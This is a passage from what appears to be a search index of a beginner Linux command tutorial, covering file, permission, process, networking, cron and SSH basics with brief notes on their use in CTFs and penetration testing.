Commands","text":""},{"location":"Linux%20Basics/03%20-%20File%20Operations/","title":"03   File Operations","text":""},{"location":"Linux%20Basics/03%20-%20File%20Operations/#purpose","title":"Purpose","text":"<p>File operations are critical when working in the command line. File operations allow you to make, copy, and remove files and directories just from the command line. Being able to add, remove, and move files to create and clean workspaces is crucial for jobs like a system admin all the way up to a professional pen tester. These skills will stick with you no matter what you do.</p>"},{"location":"Linux%20Basics/03%20-%20File%20Operations/#core-commands","title":"Core Commands","text":"<pre><code>$ mkdir testDir\n#Creates The Directory/Folder \"testDir\" In Whatever Your Current Directory Is\n\n$ touch test.txt \n#Creates The File \"test.txt\" In Whatever Directory You Are In\n\n$ mv test.txt /home/nick/Desktop\n#Moves \"test.txt\" From Its Current Directory To \"/home/nick/Desktop\"\n\n$ mv test.txt rename.txt\n#Renames \"test.txt\" to \"rename.txt\"\n\n$ cp test.txt copy.txt\n#Copies The File \"test.txt\" and Its Contents Into \"copy.txt\" So Now There Is \"test.txt\" and \"copy.txt\" With The Same Contents\n\n$ cp -r testDir copyDir/\n#Copies The Directory \"testDir\" and Its Contents Into \"copyDir\" So Now There Is \"testDir\" and \"copyDir\" With The Same Contents\n\n$ rm test.txt\n#Removes/Deletes \"test.txt\"\n\n$ rm -r testDir\n#Removes/Deletes \"testDir\" and Its Contents\n\n$ rmdir testDir\n#Removes/Delets \"testDir\" ONLY WORKS FOR EMPTY DIRECTORIES\n</code></pre> <p>Good Practice</p> <ul> <li>When working with important files that you don't want to mess up, making a copy and working on the copy is always a good idea</li> <li>Be careful when deleting files because it can be difficult or even impossible to get them back</li> <li>rmdir is to delete empty directories while rm -r is to delete directories with contents</li> </ul>"},{"location":"Linux%20Basics/03%20-%20File%20Operations/#file-operations-commands","title":"File Operations Commands","text":""},{"location":"Linux%20Basics/04%20-%20Viewing%20Files/","title":"04   Viewing Files","text":""},{"location":"Linux%20Basics/04%20-%20Viewing%20Files/#purpose","title":"Purpose","text":"<p>The ability to view and navigate file contents within the terminal is a key skill to have in CTFs and in the real world. Some servers don't have a graphical user interface to view file contents, so the terminal in the most convenient method to view the contents. These commands allow you to either see the full file or just a sneak peak so you can see if you are looking at the right file. System admins and pen testers use some of these commands to view the live actions of files. A LOT of CTFs involve you going through a secret file in order to find a hidden password.</p>"},{"location":"Linux%20Basics/04%20-%20Viewing%20Files/#core-commands","title":"Core Commands","text":"<pre><code>$ cat test.txt\nhello world1 \nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world11\n#Prints The Contents of \"test.txt\" Into The Terminal\n\n$ less test.txt\n#Opens The File \"test.txt\" In a Scrollable Pager Where You Can Use Arrow Keys To Navigate | Type \"q\" To Quit\n\n$ head test.txt\nhello world1\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\n#Prints The First 10 Lines of \"test.txt\" Into The Terminal\n\n$ head -n 3 test.txt\nhello world1\nhello world\nhello world\n#Prints The First 3 Lines of \"test.txt\"\n\n$ tail test.txt\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world11\n#Prints The Last 10 Lines of \"test.txt\" Into The Terminal\n\n$ tail -n 3 test.txt\nhello world\nhello world\nhello world11\n#Prints The Last 3 Lines of \"test.txt\"\n\n$ tail -f test.txt\nhello world1 \nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world\nhello world11\n#Prints The Contents of \"test.txt\" and Follows and Prints Changes in Real Time\n</code></pre> <p>Tips</p> <ul> <li><code>$ tail -f</code> is useful when watching logs update | not used too much in CTFs</li> <li><code>$ cat</code> is good for smaller files, but it can be overwhelming for larger ones | use <code>$ less</code> for larger files</li> </ul>"},{"location":"Linux%20Basics/04%20-%20Viewing%20Files/#viewing-files-commands","title":"Viewing Files Commands","text":""},{"location":"Linux%20Basics/05%20-%20Searching%20Files/","title":"05   Searching Files","text":""},{"location":"Linux%20Basics/05%20-%20Searching%20Files/#purpose","title":"Purpose","text":"<p>Searching files has many time saving benefits. When doing a CTF and you encounter a massive file which has thousands or lines, or you encounter a folder with a bunch of different files an folders, you can easily search and and filter through them using all of these search commands. Another extremely useful case is your about to run a large command with a lot of typing, but your not even sure if you have that command installed on your device. You run a quick \"which\" command and your problem is solved.</p>"},{"location":"Linux%20Basics/05%20-%20Searching%20Files/#core-commands","title":"Core Commands","text":"<pre><code>$ find ~ -name \"test.txt\"\n/home/nick/Desktop/testDir/test.txt\n/home/nick/Documents/test.txt\n#Prints All the Paths of \"test.txt\" in my \"home\" Directory | \"~\" Can be Replaced With a Specific Path or a \".\" to Search Your Current Directory\n\n$ find /home/nick/Documents -type f\n/home/nick/Documents/bandit.txt\n/home/nick/Documents/test2.txt\n/home/nick/Documents/test.txt\n#Prints All the Paths of Any Files in \"/home/nick/Documents\" | \"/home/nick/Documents\" can be replaced with \"~\" for \"home\" directory and \".\" for current directory\n\n$ find /home/nick/Desktop -type d\n/home/nick/Desktop\n/home/nick/Desktop/testDir\n#Prints All the Paths of Any Directories Located in \"/home/nick/Desktop\" | \"/home/nick/Desktop\" can be replaced with \"~\" for \"home\" directory and \".\" for current directory\n\n$ locate bandit.txt\n/home/nick/Documents/bandit.txt\n#Prints All the Paths Containing \"bandit.txt\" \n\n$ grep hello test.txt\nhello world\n#Searches Through \"test.txt\" for Instances of \"hello\" -&gt; Prints All Lines Containing \"hello\" \n\n$ grep -r this testDir\ntestDir/test2.txt:this a movie \ntestDir/test.txt:this is a test \n#Searches Through All Files in \"testDir\" for Instances of \"this\" -&gt; Prints All Files That Contain \"this\" Along With the Specific Lines \n\n$ which nmap\n/usr/bin/nmap\n#Prints the Loaction of \"nmap\" if \"nmap\" is Installed | If \"nmap\" isn't Installed \"nmap not found\" Would be Printed\n\n$ whereis nmap\nnmap: /usr/bin/nmap /usr/lib/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz\n#Prints All Locations of \"nmap\" if \"nmap\" is Installed | If \"nmap\" isn't Installed \"nmap not found\" Would be Printed\n</code></pre> <p>Difference</p> <ul> <li><code>$ find</code> is used for finding specific files or file types</li> <li><code>$ locate</code> is used for a more general search of a file name</li> <li><code>$ grep</code> is used for finding specific words, chars, or numbers in the contents of files</li> <li><code>$ which</code> and <code>$ whereis</code> is used for finding if specific commands are installed | ex) You are going to run a nmap scan, but you aren't sure if nmap is installed on your device <code>$ which nmap</code> will show you</li> </ul>"},{"location":"Linux%20Basics/05%20-%20Searching%20Files/#searching-files-commands","title":"Searching Files Commands","text":""},{"location":"Linux%20Basics/06%20-%20File%20Permissions/","title":"06   File Permissions","text":""},{"location":"Linux%20Basics/06%20-%20File%20Permissions/#purpose","title":"Purpose","text":"<p>File permissions are one of the most important parts of Linux because they control who can read, write, or execute files and directories. Understanding permissions is crucial for security, whether you are managing a system, working in a team environment, or doing a CTF challenge where permissions may block or allow access to important files. Hackers, sysadmins, and pen testers all need to know how to view and modify permissions to keep systems secure or to escalate privileges.</p>"},{"location":"Linux%20Basics/06%20-%20File%20Permissions/#core-commands","title":"Core Commands","text":"<pre><code>$ ls -l\n-rw-r--r--  1 nick nick   220 Aug 25 14:57 example.txt\n#Shows permissions, owner, group, size, and date of each file\n\n$ chmod 755 script.sh\n#Changes permissions of \"script.sh\" to rwxr-xr-x (owner can read/write/execute, group and others can read/execute)\n\n$ chmod +x script.sh\n#Adds execute permission to \"script.sh\" for everyone\n\n$ chown root:root example.txt\n#Changes ownership of \"example.txt\" to user \"root\" and group \"root\"\n\n$ groups\nnick : nick sudo\n#Shows which groups the current user belongs to\n\n$ umask\n0022\n#Shows the default permission mask for newly created files/directories\n</code></pre> <p>Tips for Permissions</p> <ul> <li>The 3 permission types are read (r), write (w), and execute (x).  </li> <li>The 3 permission levels are owner, group, and others.  </li> <li><code>chmod</code> can use either numbers (e.g., 755) or symbols (e.g., +x, -w).  </li> <li><code>umask</code> controls the default permissions when new files or folders are created.</li> </ul>"},{"location":"Linux%20Basics/06%20-%20File%20Permissions/#file-permissions-commands","title":"File Permissions Commands","text":""},{"location":"Linux%20Basics/07%20-%20Users%20and%20Groups/","title":"07   Users and Groups","text":""},{"location":"Linux%20Basics/07%20-%20Users%20and%20Groups/#purpose","title":"Purpose","text":"<p>Linux is a multi-user system, meaning multiple people can use the same machine with different permissions. Users and groups control access to files, processes, and commands. Understanding how to manage users and groups is key for system administration, privilege escalation in CTFs, and maintaining security in the real world.</p>"},{"location":"Linux%20Basics/07%20-%20Users%20and%20Groups/#core-commands","title":"Core Commands","text":"<pre><code>$ whoami\nnick\n#Prints the current logged-in user\n\n$ id\nuid=1000(nick) gid=1000(nick) groups=1000(nick),27(sudo)\n#Shows user ID, group ID, and group memberships\n\n$ su root\nPassword:\n#Switches current user to \"root\" (requires root password)\n\n$ sudo ls /root\n#Runs \"ls /root\" as root using sudo (requires user to be in sudo group)\n\n$ adduser testuser\n#Creates a new user \"testuser\"\n\n$ cat /etc/passwd\nnick:x:1000:1000:nick:/home/nick:/bin/bash\n#Shows all user accounts, their IDs, home directories, and default shells\n</code></pre> <p>User &amp; Group Basics</p> <ul> <li>Every file and process belongs to a user and a group.  </li> <li><code>sudo</code> allows temporary root privileges if the user is in the sudoers file.  </li> <li><code>/etc/passwd</code> stores user account details (but not passwords \u2014 those are in <code>/etc/shadow</code>).  </li> <li>Groups allow permissions to be shared among multiple users.</li> </ul>"},{"location":"Linux%20Basics/07%20-%20Users%20and%20Groups/#users-and-groups-commands","title":"Users and Groups Commands","text":""},{"location":"Linux%20Basics/08%20-%20Processes/","title":"08   Processes","text":""},{"location":"Linux%20Basics/08%20-%20Processes/#purpose","title":"Purpose","text":"<p>Processes are programs that are running on your system. Being able to view, manage, and control processes is critical for system administration, performance monitoring, and in CTFs where you may need to identify suspicious processes or kill something that\u2019s blocking you. Hackers and sysadmins alike need to know how to find and manage processes effectively.</p>"},{"location":"Linux%20Basics/08%20-%20Processes/#core-commands","title":"Core Commands","text":"<pre><code>$ ps\n  PID TTY          TIME CMD\n 2342 pts/0    00:00:00 bash\n 2451 pts/0    00:00:00 ps\n#Lists currently running processes for the current shell\n\n$ ps aux\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 106240  8380 ?        Ss   08:00   0:03 systemd\n#Shows all running processes with detailed info\n\n$ top\n#Opens interactive real-time process monitor (press q to quit)\n\n$ htop\n#Similar to top but more user-friendly and interactive (may need to be installed)\n\n$ kill 2451\n#Kills the process with PID 2451\n\n$ jobs\n[1]+  Running                 ping google.com &amp;\n#Lists background jobs in the current shell\n\n$ command &amp;\n#Runs \"command\" in the background\n\n$ fg %1\n#Brings job 1 back to the foreground\n\n$ bg %1\n#Resumes job 1 in the background\n</code></pre> <p>Tips for Process Management</p> <ul> <li>Use <code>ps aux | grep &lt;process&gt;</code> to search for a specific process.  </li> <li><code>kill -9 &lt;PID&gt;</code> force-kills a stubborn process.  </li> <li><code>top</code> and <code>htop</code> are great for monitoring CPU/memory usage in real time.  </li> <li>Backgrounding with <code>&amp;</code> is useful when running long commands so your shell stays usable.</li> </ul>"},{"location":"Linux%20Basics/08%20-%20Processes/#processes-commands","title":"Processes Commands","text":""},{"location":"Linux%20Basics/09%20-%20System%20Info/","title":"09   System Info","text":""},{"location":"Linux%20Basics/09%20-%20System%20Info/#purpose","title":"Purpose","text":"<p>Knowing basic system information is important when working on Linux machines. In CTFs you may need to learn about the environment you are working in to figure out what you can and cannot do. In the real world, system admins and penetration testers use these commands to check kernel versions, uptime, resource usage, and available space. These commands give you a quick way to learn about the system without needing a GUI.</p>"},{"location":"Linux%20Basics/09%20-%20System%20Info/#core-commands","title":"Core Commands","text":"<pre><code>$ uname -a\nLinux kali 6.6.9-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.9-1kali1 (2024-01-10) x86_64 GNU/Linux\n#Prints Kernel Name, Version, Machine, and Other System Info\n\n$ hostname\nkali\n#Prints The Name of The System\n\n$ uptime\n 16:40:17 up  1:23,  2 users,  load average: 0.10, 0.21, 0.18\n#Shows How Long The System Has Been Running, How Many Users Logged In, and System Load Averages\n\n$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\nudev            2.0G     0  2.0G   0% /dev\ntmpfs           394M  1.6M  392M   1% /run\n/dev/sda1        50G   20G   28G  42% /\n#Shows Disk Space Usage of All File Systems in Human-Readable Format (-h)\n\n$ free -m\n              total        used        free      shared  buff/cache   available\nMem:           3940        1486         912         156        1541        2112\nSwap:          2047           0        2047\n#Shows Memory Usage in Megabytes (-m)\n</code></pre> <p>System Info Basics</p> <ul> <li><code>uname -a</code> is helpful in CTFs for finding kernel version \u2192 may hint at kernel exploits.  </li> <li><code>hostname</code> is often used to identify machines when pivoting across networks.  </li> <li><code>uptime</code> can help detect if a system was recently rebooted (useful in attacks/log clearing).  </li> <li><code>df -h</code> and <code>free -m</code> are great for spotting low disk/memory, which can cause instability during attacks or scans.</li> </ul>"},{"location":"Linux%20Basics/09%20-%20System%20Info/#system-info-commands","title":"System Info Commands","text":""},{"location":"Linux%20Basics/10%20-%20Networking%20Basics/","title":"10   Networking Basics","text":""},{"location":"Linux%20Basics/10%20-%20Networking%20Basics/#purpose","title":"Purpose","text":"<p>Networking commands are critical when working on remote machines or during CTF challenges. They allow you to see IP addresses, test connectivity, view open ports, and transfer data. In the real world, sysadmins and penetration testers use these commands daily to troubleshoot network issues, verify configurations, and check connectivity between systems.</p>"},{"location":"Linux%20Basics/10%20-%20Networking%20Basics/#core-commands","title":"Core Commands","text":"<pre><code>$ ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255\n        ether 08:00:27:1a:2b:3c  txqueuelen 1000  (Ethernet)\n#Displays Network Interfaces, IP Addresses, and MAC Addresses | Legacy command\n\n$ ip a\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    inet 192.168.1.10/24 brd 192.168.1.255 scope global dynamic eth0\n       valid_lft 86375sec preferred_lft 86375sec\n#Displays All Network Interfaces and Their Details | Preferred over ifconfig\n\n$ ping -c 4 google.com\nPING google.com (142.250.190.14) 56(84) bytes of data.\n64 bytes from lga25s60-in-f14.1e100.net (142.250.190.14): icmp_seq=1 ttl=114 time=23.5 ms\n#Sends 4 ICMP Echo Requests to Test Connectivity to \"google.com\"\n\n$ netstat -tuln\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n#Displays Active Connections and Listening Ports | Deprecated but still used\n\n$ ss -tuln\nNetid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22           0.0.0.0:*\n#Displays Active Connections and Listening Ports | Replacement for netstat\n\n$ curl http://example.com\n&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Example Domain&lt;/title&gt;&lt;/head&gt;...&lt;/html&gt;\n#Fetches and Displays Contents of a Web Page (HTTP Request)\n\n$ wget http://example.com/file.txt\n--2025-09-21 17:41:19--  http://example.com/file.txt\nSaving to: \u2018file.txt\u2019\n#Downloads a File from a Web Server to Your System\n</code></pre> <p>Networking Basics</p> <ul> <li><code>ip a</code> is preferred over <code>ifconfig</code> on modern systems, but both show interface and IP info.  </li> <li><code>ping</code> is great for checking connectivity, but blocked ICMP doesn\u2019t always mean the host is down.  </li> <li><code>netstat</code> is deprecated \u2192 <code>ss</code> is its modern replacement for socket and port info.  </li> <li><code>curl</code> is better for API requests, while <code>wget</code> is better for bulk/simple downloads.</li> </ul>"},{"location":"Linux%20Basics/10%20-%20Networking%20Basics/#networking-basics-commands","title":"Networking Basics Commands","text":""},{"location":"Linux%20Basics/11%20-%20Archives%20and%20Compression/","title":"11   Archives and Compression","text":""},{"location":"Linux%20Basics/11%20-%20Archives%20and%20Compression/#purpose","title":"Purpose","text":"<p>Working with archives and compressed files is a must in both CTFs and real-world environments. Many files are shared in compressed formats to save space or bundle multiple files together. Knowing how to create, extract, and compress archives allows you to quickly work with data, whether you\u2019re grabbing CTF challenge files, downloading logs, or handling backups.</p>"},{"location":"Linux%20Basics/11%20-%20Archives%20and%20Compression/#core-commands","title":"Core Commands","text":"<pre><code>$ tar -cvf archive.tar file1.txt file2.txt\n#Creates \"archive.tar\" Containing file1.txt and file2.txt | -c = create, -v = verbose, -f = filename\n\n$ tar -xvf archive.tar\n#Extracts the Contents of \"archive.tar\"\n\n$ tar -czvf archive.tar.gz file1.txt file2.txt\n#Creates a Gzipped Archive \"archive.tar.gz\" Containing file1.txt and file2.txt | -z = gzip compression\n\n$ tar -xzvf archive.tar.gz\n#Extracts a Gzipped Archive \"archive.tar.gz\"\n\n$ gzip file.txt\n#Compresses \"file.txt\" Into \"file.txt.gz\" and Removes Original File\n\n$ gunzip file.txt.gz\n#Decompresses \"file.txt.gz\" Back Into \"file.txt\"\n\n$ zip archive.zip file1.txt file2.txt\n#Creates a Zip Archive \"archive.zip\" Containing file1.txt and file2.txt\n\n$ unzip archive.zip\n#Extracts the Contents of \"archive.zip\"\n</code></pre> <p>Archives &amp; Compression Basics</p> <ul> <li><code>tar</code> is used for bundling multiple files together; <code>gzip</code> adds compression on top of it.  </li> <li><code>tar.gz</code> (aka \u201ctarball\u201d) is very common in Linux distributions.  </li> <li><code>zip/unzip</code> are more common in Windows environments but still widely used in Linux.  </li> <li>Always check what type of archive you\u2019re working with before extracting.</li> </ul>"},{"location":"Linux%20Basics/11%20-%20Archives%20and%20Compression/#archives-and-compression-commands","title":"Archives and Compression Commands","text":""},{"location":"Linux%20Basics/12%20-%20Editors/","title":"12   Editors","text":""},{"location":"Linux%20Basics/12%20-%20Editors/#purpose","title":"Purpose","text":"<p>Text editors are essential in Linux because many systems don\u2019t have a GUI. In CTFs, you may need to open and edit files directly from the terminal. In the real world, sysadmins and penetration testers often edit configuration files, scripts, or logs using terminal-based editors.</p>"},{"location":"Linux%20Basics/12%20-%20Editors/#core-commands","title":"Core Commands","text":"<pre><code>$ nano test.txt\n#Opens \"test.txt\" in the Nano Text Editor | Ctrl+O to Save, Ctrl+X to Exit\n\n$ vim test.txt\n#Opens \"test.txt\" in Vim Editor | Press \"i\" to Insert, \"Esc\" to Exit Insert, \":wq\" to Save &amp; Quit\n\n$ gedit test.txt\n#Opens \"test.txt\" in Gedit GUI Text Editor (if installed)\n</code></pre> <p>Editors Basics</p> <ul> <li><code>nano</code> is beginner-friendly, perfect for quick edits.  </li> <li><code>vim</code> is more powerful but has a steep learning curve.  </li> <li><code>gedit</code> is GUI-based, better when working in desktop environments.</li> </ul>"},{"location":"Linux%20Basics/12%20-%20Editors/#editors-commands","title":"Editors Commands","text":""},{"location":"Linux%20Basics/13%20-%20Scripting%20Basics/","title":"13   Scripting Basics","text":""},{"location":"Linux%20Basics/13%20-%20Scripting%20Basics/#purpose","title":"Purpose","text":"<p>Shell scripting is a core Linux skill. Scripts let you automate tasks, chain commands, and create repeatable tools. In CTFs, scripts can speed up repetitive exploitation. In the real world, sysadmins and penetration testers use them to manage systems and automate workflows.</p>"},{"location":"Linux%20Basics/13%20-%20Scripting%20Basics/#core-commands","title":"Core Commands","text":"<pre><code>$ nano script.sh\n#Creates/Edit a Script File \"script.sh\"\n\n#!/bin/bash\necho \"Hello World\"\n#Basic Script With Shebang and Command\n\n$ chmod +x script.sh\n#Gives Execution Permissions to \"script.sh\"\n\n$ ./script.sh\nHello World\n#Executes \"script.sh\"\n</code></pre> <p>Scripting Basics</p> <ul> <li>Always start scripts with a shebang (<code>#!/bin/bash</code>) to specify interpreter.  </li> <li><code>chmod +x</code> makes scripts executable.  </li> <li>Useful for automating repetitive commands in CTFs or sysadmin tasks.</li> </ul>"},{"location":"Linux%20Basics/13%20-%20Scripting%20Basics/#scripting-basics-commands","title":"Scripting Basics Commands","text":""},{"location":"Linux%20Basics/14%20-%20Environment%20Variables/","title":"14   Environment Variables","text":""},{"location":"Linux%20Basics/14%20-%20Environment%20Variables/#purpose","title":"Purpose","text":"<p>Environment variables store configuration values that control how processes run. In CTFs, they can reveal hidden paths or misconfigurations. In real-world scenarios, sysadmins and penetration testers check variables like <code>$PATH</code> to debug issues or configure tools.</p>"},{"location":"Linux%20Basics/14%20-%20Environment%20Variables/#core-commands","title":"Core Commands","text":"<pre><code>$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n#Prints The Current PATH Variable\n\n$ export TEST=hello\n#Creates a Temporary Environment Variable \"TEST\" with Value \"hello\"\n\n$ echo $TEST\nhello\n#Prints Value of TEST Variable\n\n$ nano ~/.bashrc\n#Opens Bash Configuration File Where You Can Add Permanent Variables\n</code></pre> <p>Environment Variables Basics</p> <ul> <li><code>$PATH</code> defines where the system looks for executables.  </li> <li><code>export</code> sets variables for the current session.  </li> <li>Adding variables to <code>~/.bashrc</code> makes them permanent across sessions.  </li> <li>Misconfigured environment variables can break tools or create exploits.</li> </ul>"},{"location":"Linux%20Basics/14%20-%20Environment%20Variables/#environment-variables-commands","title":"Environment Variables Commands","text":""},{"location":"Linux%20Basics/15%20-%20Symbolic%20Links/","title":"15   Symbolic Links","text":""},{"location":"Linux%20Basics/15%20-%20Symbolic%20Links/#purpose","title":"Purpose","text":"<p>Symbolic links (symlinks) are pointers to other files or directories. They are commonly used to reference files in different locations without duplicating them. In CTFs, symlinks can help redirect processes or uncover hidden file paths. In the real world, they are useful for organizing files, managing configs, and maintaining compatibility.</p>"},{"location":"Linux%20Basics/15%20-%20Symbolic%20Links/#core-commands","title":"Core Commands","text":"<pre><code>$ ln -s /home/nick/test.txt link.txt\n#Creates a Symbolic Link \"link.txt\" That Points to \"test.txt\"\n\n$ ls -l\nlrwxrwxrwx 1 nick nick    8 Sep 21 17:30 link.txt -&gt; test.txt\n#Shows \"link.txt\" as a Symlink to \"test.txt\"\n\n$ cat link.txt\nhello world\n#Accessing \"link.txt\" Shows the Contents of \"test.txt\"\n</code></pre> <p>Symbolic Links Basics</p> <ul> <li><code>ln -s</code> creates a soft link (pointer) instead of copying.  </li> <li>Deleting the symlink doesn\u2019t remove the original file.  </li> <li>If the original file is deleted, the symlink becomes broken.  </li> <li>Useful for config files, version control, and redirecting paths.</li> </ul>"},{"location":"Linux%20Basics/15%20-%20Symbolic%20Links/#symbolic-links-commands","title":"Symbolic Links Commands","text":""},{"location":"Linux%20Basics/16%20-%20Package%20Management/","title":"16   Package Management","text":""},{"location":"Linux%20Basics/16%20-%20Package%20Management/#purpose","title":"Purpose","text":"<p>Package management allows you to install, remove, and update software on Linux. In CTFs, you may need to quickly install missing tools. In real-world environments, sysadmins and penetration testers rely on package managers to maintain systems securely and efficiently.</p>"},{"location":"Linux%20Basics/16%20-%20Package%20Management/#core-commands","title":"Core Commands","text":"<pre><code>$ sudo apt update\n#Updates the List of Available Packages\n\n$ sudo apt upgrade\n#Upgrades All Installed Packages to Latest Versions\n\n$ sudo apt install nmap\n#Installs \"nmap\" Package\n\n$ sudo apt remove nmap\n#Removes \"nmap\" Package\n\n$ dpkg -i package.deb\n#Installs a Package From a Local .deb File\n\n$ apt-cache search nmap\nnmap - The Network Mapper\n#Searches For \"nmap\" in the Package Repository\n</code></pre> <p>Package Management Basics</p> <ul> <li><code>apt</code> is the higher-level tool used in Debian/Ubuntu systems.  </li> <li><code>dpkg</code> handles <code>.deb</code> files directly.  </li> <li>Always run <code>apt update</code> before installing new packages.  </li> <li>Be cautious with upgrades on production systems \u2014 they may break dependencies.</li> </ul>"},{"location":"Linux%20Basics/16%20-%20Package%20Management/#package-management-commands","title":"Package Management Commands","text":""},{"location":"Linux%20Basics/17%20-%20Logging/","title":"17   Logging","text":""},{"location":"Linux%20Basics/17%20-%20Logging/#purpose","title":"Purpose","text":"<p>Logs provide critical information about what is happening on a system. In CTFs, checking logs can reveal misconfigurations, failed logins, or hidden activity. In the real world, sysadmins and penetration testers rely on logs for troubleshooting, monitoring, and forensic analysis.</p>"},{"location":"Linux%20Basics/17%20-%20Logging/#core-commands","title":"Core Commands","text":"<pre><code>$ cd /var/log\n#Default Directory That Contains System and Application Logs\n\n$ ls /var/log/\nauth.log  syslog  dmesg  kern.log\n#Lists Common Logs (Authentication, System, Kernel)\n\n$ cat /var/log/auth.log\n#View Authentication Log Entries\n\n$ tail -f /var/log/syslog\n#Follow the System Log in Real Time\n\n$ dmesg | less\n#Displays Kernel Ring Buffer Messages (Hardware/Driver Info)\n</code></pre> <p>Logging Basics</p> <ul> <li><code>/var/log/</code> is the main directory for logs.  </li> <li><code>auth.log</code> \u2192 authentication attempts; <code>syslog</code> \u2192 general system events; <code>dmesg</code> \u2192 kernel info.  </li> <li><code>tail -f</code> is great for live monitoring logs during attacks or troubleshooting.  </li> <li>Logs are key in incident response and digital forensics.</li> </ul>"},{"location":"Linux%20Basics/17%20-%20Logging/#logging-commands","title":"Logging Commands","text":""},{"location":"Linux%20Basics/18%20-%20Redirection%20%26%20Pipes/","title":"18   Redirection & Pipes","text":""},{"location":"Linux%20Basics/18%20-%20Redirection%20%26%20Pipes/#purpose","title":"Purpose","text":"<p>Redirection and pipes let you control input and output between commands. They are extremely powerful in both CTFs and real-world environments. You can save output to files, append results, or chain multiple commands together to process data efficiently.</p>"},{"location":"Linux%20Basics/18%20-%20Redirection%20%26%20Pipes/#core-commands","title":"Core Commands","text":"<pre><code>$ echo \"hello\" &gt; file.txt\n#Writes \"hello\" Into file.txt (Overwrites if Exists)\n\n$ echo \"world\" &gt;&gt; file.txt\n#Appends \"world\" to file.txt\n\n$ cat &lt; file.txt\n#Reads file.txt Using Input Redirection\n\n$ cat file.txt | grep hello\nhello\n#Pipes the Output of cat Into grep to Search for \"hello\"\n\n$ ps aux | grep bash\nnick      1234  0.0  0.1  12345  2345 ?        S    12:34   0:00 bash\n#Finds Processes Containing \"bash\" by Piping ps Output Into grep\n</code></pre> <p>Redirection &amp; Pipes Basics</p> <ul> <li><code>&gt;</code> overwrites, while <code>&gt;&gt;</code> appends.  </li> <li><code>&lt;</code> redirects a file as input to a command.  </li> <li><code>|</code> pipes the output of one command into another.  </li> <li>Common CTF trick: pipe command outputs into <code>grep</code> or <code>strings</code> to quickly extract info.</li> </ul>"},{"location":"Linux%20Basics/18%20-%20Redirection%20%26%20Pipes/#redirection-pipes-commands","title":"Redirection &amp; Pipes Commands","text":""},{"location":"Linux%20Basics/19%20-%20Wildcards%20%26%20Globbing/","title":"19   Wildcards & Globbing","text":""},{"location":"Linux%20Basics/19%20-%20Wildcards%20%26%20Globbing/#purpose","title":"Purpose","text":"<p>Wildcards and globbing allow you to select groups of files and directories without typing them all out. They are extremely useful in CTFs for quickly filtering file lists or searching through directories. In the real world, sysadmins and penetration testers use them to work with large sets of files efficiently.</p>"},{"location":"Linux%20Basics/19%20-%20Wildcards%20%26%20Globbing/#core-commands","title":"Core Commands","text":"<pre><code>$ ls *.txt\n#Lists All Files Ending in \".txt\"\n\n$ ls file?.txt\n#Lists Files Like file1.txt, file2.txt, fileA.txt (Single Character Match)\n\n$ ls [ab]*.txt\n#Lists Files Starting With \"a\" or \"b\" That End in \".txt\"\n\n$ rm *.log\n#Deletes All Files Ending in \".log\"\n</code></pre> <p>Wildcards &amp; Globbing Basics</p> <ul> <li><code>*</code> \u2192 matches zero or more characters.  </li> <li><code>?</code> \u2192 matches exactly one character.  </li> <li><code>[ ]</code> \u2192 matches any character in the brackets.  </li> <li>Great for bulk operations, but dangerous with commands like <code>rm</code>.</li> </ul>"},{"location":"Linux%20Basics/19%20-%20Wildcards%20%26%20Globbing/#wildcards-globbing-commands","title":"Wildcards &amp; Globbing Commands","text":""},{"location":"Linux%20Basics/20%20-%20Cron%20Jobs/","title":"20   Cron Jobs","text":""},{"location":"Linux%20Basics/20%20-%20Cron%20Jobs/#purpose","title":"Purpose","text":"<p>Cron jobs allow you to schedule commands or scripts to run automatically at specific times. In CTFs, cron jobs can sometimes be exploited for persistence or privilege escalation. In the real world, they are essential for automating backups, maintenance, and monitoring tasks.</p>"},{"location":"Linux%20Basics/20%20-%20Cron%20Jobs/#core-commands","title":"Core Commands","text":"<pre><code>$ crontab -l\n#Lists Current User's Cron Jobs\n\n$ crontab -e\n#Edits the Current User's Cron Jobs\n\n# Example Entry in crontab (runs script every day at midnight)\n0 0 * * * /home/nick/backup.sh\n\n$ systemctl status cron\n#Checks Status of Cron Service\n</code></pre> <p>Cron Jobs Basics</p> <ul> <li>Cron jobs are defined in crontab files.  </li> <li>Format: <code>minute hour day month weekday command</code>.  </li> <li><code>crontab -e</code> opens the editor to add new jobs.  </li> <li>Useful for automation, but also a common target in privilege escalation.</li> </ul>"},{"location":"Linux%20Basics/20%20-%20Cron%20Jobs/#cron-jobs-commands","title":"Cron Jobs Commands","text":""},{"location":"Linux%20Basics/21%20-%20SSH%20Basics/","title":"21   SSH Basics","text":""},{"location":"Linux%20Basics/21%20-%20SSH%20Basics/#purpose","title":"Purpose","text":"<p>SSH (Secure Shell) is used to securely connect to remote systems. In CTFs, SSH is often a way to pivot or gain shell access once credentials are discovered. In the real world, sysadmins and penetration testers use SSH daily for remote management and file transfers.</p>"},{"location":"Linux%20Basics/21%20-%20SSH%20Basics/#core-commands","title":"Core Commands","text":"<pre><code>$ ssh user@192.168.1.10\n#Connects to Remote Host at 192.168.1.10 as \"user\"\n\n$ ssh -p 2222 user@192.168.1.10\n#Connects Using Port 2222 Instead of Default Port 22\n\n$ ssh -i id_rsa user@192.168.1.10\n#Connects Using SSH Key \"id_rsa\" for Authentication\n\n$ 